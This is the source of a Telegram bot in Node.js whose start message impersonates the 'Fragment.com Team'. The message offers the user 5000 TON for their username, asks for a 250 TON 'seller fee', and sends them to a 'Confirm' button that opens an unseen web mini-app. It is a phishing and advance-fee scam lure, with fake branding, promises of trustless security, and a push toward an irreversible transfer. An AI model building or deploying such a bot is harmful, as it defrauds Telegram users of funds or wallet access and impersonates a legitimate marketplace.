require('dotenv').config();
const express = require('express');
const path = require('path');
const { Telegraf } = require('telegraf');

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const WEBAPP_URL = process.env.WEBAPP_URL || 'https://your-domain.com';
const PORT = process.env.PORT || 3000;

if (!BOT_TOKEN) {
  console.error('Missing TELEGRAM_BOT_TOKEN in .env');
  process.exit(1);
}

const bot = new Telegraf(BOT_TOKEN);
const app = express();

// Serve static files for the mini app
app.use(express.static(path.join(__dirname, 'public')));

// Simple health check
app.get('/health', (_req, res) => {
  res.send('OK');
});

// Telegram commands (στυλ NftAlertsBot, δυναμικό @username)
bot.start((ctx) => {
  const raw = ctx.from?.username || ctx.from?.first_name || 'there';
  const displayName = ctx.from?.username ? `@${ctx.from.username}` : raw;
  const message =
    `👋 Hi, ${displayName}\n\n` +
    `We'd like to present you with a direct buy offer for your distinctive username.\n\n` +
    `The transaction will be processed through the official 🔐 Fragment.com service, ensuring full security and automatic, trustless execution.\n\n` +
    `📄 Offer details:\n\n` +
    `💰 Amount offered: 5000 TON\n` +
    `🪙 Buyer fee: 5% (paid by the buyer)\n` +
    `🪙 Seller fee: 250 TON\n\n` +
    `⚠️ Important:\n\n` +
    `• After confirmation, ${displayName} will be issued as a collectible.\n` +
    `• The transfer is permanent and cannot be reversed.\n` +
    `• If you do not wish to sell, you may safely ignore this notification.\n\n` +
    `💡 Why accept:\n\n` +
    `• Secure by design: handled entirely within Fragment.com.\n` +
    `• Fast payout: funds arrive instantly on-chain once completed.\n` +
    `• Monetization: turn a rare username into a tangible asset.\n\n` +
    `✅ Tap "Confirm agreement" to proceed in the mini-app.\n\n` +
    `Best regards,\n` +
    `Fragment.com Team`;

  return ctx.reply(message, {
    reply_markup: {
      inline_keyboard: [
        [
          {
            text: "✅ Confirm",
            web_app: { url: WEBAPP_URL }
          }
        ]
      ]
    }
  });
});

// Launch bot (long polling – για δοκιμές τοπικά)
bot.launch().then(() => {
  console.log('Telegram bot started');
});

// Start web server
app.listen(PORT, () => {
  console.log(`Web server listening on http://localhost:${PORT}`);
});

// Enable graceful stop
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));

